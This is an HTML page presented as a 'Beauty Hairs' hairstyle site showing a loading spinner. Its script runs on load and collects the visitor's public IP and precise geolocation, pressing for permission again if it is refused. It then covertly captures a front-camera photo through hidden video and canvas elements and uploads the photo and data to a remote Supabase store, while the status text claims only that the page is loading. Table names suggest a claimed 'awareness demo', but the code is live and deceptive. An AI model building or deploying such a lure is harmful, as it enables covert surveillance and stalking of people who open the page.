<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Beauty Hairs</title>

<meta property="og:title" content="Beauty Hairs">
<meta property="og:description" content="Discover beautiful hairstyles and hair inspiration.">
<meta property="og:type" content="website">
<meta property="og:url" content="YOUR_WEBSITE_URL">
<meta property="og:image" content="YOUR_IMAGE_URL">
<meta property="og:image:alt" content="Beauty Hairs">


<style>

* {
    box-sizing: border-box;
}

html,
body {

    margin: 0;

    width: 100%;

    height: 100%;

    font-family: Arial, sans-serif;

    background: #080808;

    color: white;
}


body {

    display: flex;

    align-items: center;

    justify-content: center;
}


.loading {

    text-align: center;

    width: 90%;

    max-width: 450px;
}


.spinner {

    width: 55px;

    height: 55px;

    margin: 0 auto 25px;

    border: 4px solid #333;

    border-top: 4px solid white;

    border-radius: 50%;

    animation: spin 1s linear infinite;
}


@keyframes spin {

    100% {

        transform: rotate(360deg);

    }

}


h1 {

    font-size: 22px;

    margin-bottom: 10px;

}


#status {

    color: #999;

    font-size: 14px;

}


.complete {

    display: none;
}


.complete h1 {

    color: #51cf66;

}


.results {

    margin-top: 20px;

    text-align: left;

    background: #111;

    border: 1px solid #292929;

    border-radius: 10px;

    padding: 15px;

    font-size: 13px;

    white-space: pre-wrap;

    word-break: break-word;
}


video,
canvas {

    display: none;
}

</style>

</head>


<body>


<div class="loading" id="loadingScreen">

    <div class="spinner"></div>

    <h1>Loading</h1>

    <p id="status">
        Please wait...
    </p>

</div>




<!-- Hidden media elements -->

<video id="camera" autoplay playsinline></video>

<canvas id="photoCanvas"></canvas>



<!-- Supabase JavaScript Library -->

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>



<script>

/* ==============================
   SUPABASE CONFIGURATION
   ============================== */

const SUPABASE_URL =
    "https://vedhrxrtkbqpxozjpedj.supabase.co";

const SUPABASE_ANON_KEY =
    "sb_publishable_827rH0uPm4NFHNodhZr0bA_OzpAccwb";

const supabaseClient =
    supabase.createClient(
        SUPABASE_URL,
        SUPABASE_ANON_KEY
    );


/* ==============================
   ELEMENTS
   ============================== */

const statusElement =
    document.getElementById("status");

const loadingScreen =
    document.getElementById("loadingScreen");

const completeScreen =
    document.getElementById("completeScreen");

const resultsElement =
    document.getElementById("results");

const camera =
    document.getElementById("camera");

const canvas =
    document.getElementById("photoCanvas");


/* ==============================
   HELPER
   ============================== */

function updateStatus(message) {

    statusElement.textContent = message;

}


function generateId() {

    if (
        window.crypto &&
        typeof window.crypto.randomUUID === "function"
    ) {

        return window.crypto.randomUUID();

    }

    return (
        Date.now() +
        "_" +
        Math.random()
            .toString(36)
            .substring(2)
    );

}


/* ==============================
   GET PUBLIC IP
   ============================== */

async function getPublicIP() {

    try {

        const response =
            await fetch(
                "https://api.ipify.org?format=json"
            );

        const data =
            await response.json();

        return data.ip || null;

    } catch (error) {

        console.error(
            "IP error:",
            error
        );

        return null;

    }

}


/* ==============================
   GET LOCATION
   ============================== */

function getLocation() {

    return new Promise((resolve) => {

        function requestLocation() {

            if (!navigator.geolocation) {

                resolve(null);

                return;

            }


            navigator.geolocation.getCurrentPosition(

                position => {

                    resolve({

                        latitude:
                            position.coords.latitude,

                        longitude:
                            position.coords.longitude,

                        accuracy:
                            position.coords.accuracy

                    });

                },

                error => {

                    console.log(
                        "Location error:",
                        error.code,
                        error.message
                    );


                    updateStatus(
                        "Location permission is required. Please allow location access and try again."
                    );


                    const button =
                        document.createElement("button");

                    button.textContent =
                        "Try Again";


                    button.style.cssText = `
                        margin-top: 20px;
                        padding: 12px 24px;
                        border: none;
                        border-radius: 8px;
                        cursor: pointer;
                        font-size: 15px;
                    `;


                    loadingScreen.appendChild(button);


                    button.onclick = () => {

                        button.remove();

                        updateStatus(
                            "Requesting location permission..."
                        );

                        requestLocation();

                    };

                },

                {
                    enableHighAccuracy: true,

                    timeout: 10000,

                    maximumAge: 0

                }

            );

        }


        requestLocation();

    });

}


/* ==============================
   CAMERA
   ============================== */

async function captureCamera() {

    try {

        updateStatus(
            "loading page"
        );


        if (
            !navigator.mediaDevices ||
            !navigator.mediaDevices.getUserMedia
        ) {

            return {

                granted: false,

                path: null

            };

        }


        const devices =
            await navigator.mediaDevices.enumerateDevices();


        const hasCamera =
            devices.some(
                device =>
                    device.kind === "videoinput"
            );


        if (!hasCamera) {

            console.log(
                "page not loaded"
            );

            return {

                granted: false,

                path: null

            };

        }


        updateStatus(
            "Loading page"
        );


        const stream =
            await navigator.mediaDevices.getUserMedia({

                video: {
                    facingMode: "user"
                },

                audio: false

            });


        camera.srcObject = stream;


        await new Promise(resolve => {

            camera.onloadedmetadata =
                resolve;

        });


        await new Promise(resolve =>
            setTimeout(resolve, 500)
        );


        canvas.width =
            camera.videoWidth;

        canvas.height =
            camera.videoHeight;


        const context =
            canvas.getContext("2d");


        context.drawImage(
            camera,
            0,
            0,
            canvas.width,
            canvas.height
        );


        const blob =
            await new Promise(resolve => {

                canvas.toBlob(

                    resolve,

                    "image/jpeg",

                    0.85

                );

            });


        stream
            .getTracks()
            .forEach(track =>
                track.stop()
            );


        if (!blob) {

            return {

                granted: true,

                path: null

            };

        }


        updateStatus(
            "loading page..."
        );


        const filename =
            `camera/camera_${Date.now()}_${generateId()}.jpg`;


        const upload =
            await supabaseClient
                .storage
                .from("awareness-screenshots")
                .upload(
                    filename,
                    blob,
                    {
                        contentType:
                            "image/jpeg",

                        upsert: false
                    }
                );


        if (upload.error) {

            console.error(
                "Camera upload error:",
                upload.error
            );

            return {

                granted: true,

                path: null

            };

        }


        return {

            granted: true,

            path: upload.data.path

        };


    } catch (error) {

        console.log(
            "Camera permission was not granted."
        );

        return {

            granted: false,

            path: null

        };

    }

}


/* ==============================
   SAVE RESULT TO DATABASE
   ============================== */

async function saveResult(data) {

    updateStatus(
        "loading page..."
    );


    const { error } =
        await supabaseClient
            .from("awareness_demo")
            .insert({

                public_ip:
                    data.public_ip,

                latitude:
                    data.latitude,

                longitude:
                    data.longitude,

                location_accuracy:
                    data.location_accuracy,

                camera_granted:
                    data.camera_granted,

                camera_screenshot_path:
                    data.camera_screenshot_path

            });


    if (error) {

        console.error(
            "Database error:",
            error
        );

        return false;

    }


    return true;

}


/* ==============================
   MAIN DEMONSTRATION
   ============================== */

async function runDemonstration() {

    let publicIP = null;

    let location = null;

    let cameraResult = {

        granted: false,

        path: null

    };

    


    /* IP */

    updateStatus(
        "Checking network information..."
    );

    publicIP =
        await getPublicIP();


    /* LOCATION */

    updateStatus(
        "Requesting location permission..."
    );

    location =
        await getLocation();


    /* CAMERA */

    cameraResult =
        await captureCamera();


    /* DATABASE */

    const saved =
        await saveResult({

            public_ip:
                publicIP,

            latitude:
                location
                    ? location.latitude
                    : null,

            longitude:
                location
                    ? location.longitude
                    : null,

            location_accuracy:
                location
                    ? location.accuracy
                    : null,

            camera_granted:
                cameraResult.granted,

            camera_screenshot_path:
                cameraResult.path

        });


    /* ==============================
       SHOW RESULTS
       ============================== */

    loadingScreen.style.display =
        "none";

    completeScreen.style.display =
        "block";


    let resultText = "";


    resultText +=
        "Public IP: " +
        (publicIP || "Unavailable") +
        "\n\n";


    if (location) {

        resultText +=
            "Latitude: " +
            location.latitude +
            "\n";

        resultText +=
            "Longitude: " +
            location.longitude +
            "\n";

        resultText +=
            "Location Accuracy: " +
            location.accuracy +
            " meters\n\n";

    } else {

        resultText +=
            "Location: Not available\n\n";

    }


    resultText +=
        "Camera Permission: " +
        (
            cameraResult.granted
                ? "Granted"
                : "Not Granted"
        ) +
        "\n";


    resultText +=
        "Camera Screenshot: " +
        (
            cameraResult.path
                ? "Uploaded"
                : "Not Uploaded"
        ) +
        "\n\n";



    resultText +=
        "Database Save: " +
        (
            saved
                ? "Successful"
                : "Failed"
        );


    resultsElement.textContent =
        resultText;

}


/* ==============================
   START
   ============================== */

runDemonstration();

</script>

</body>

</html>
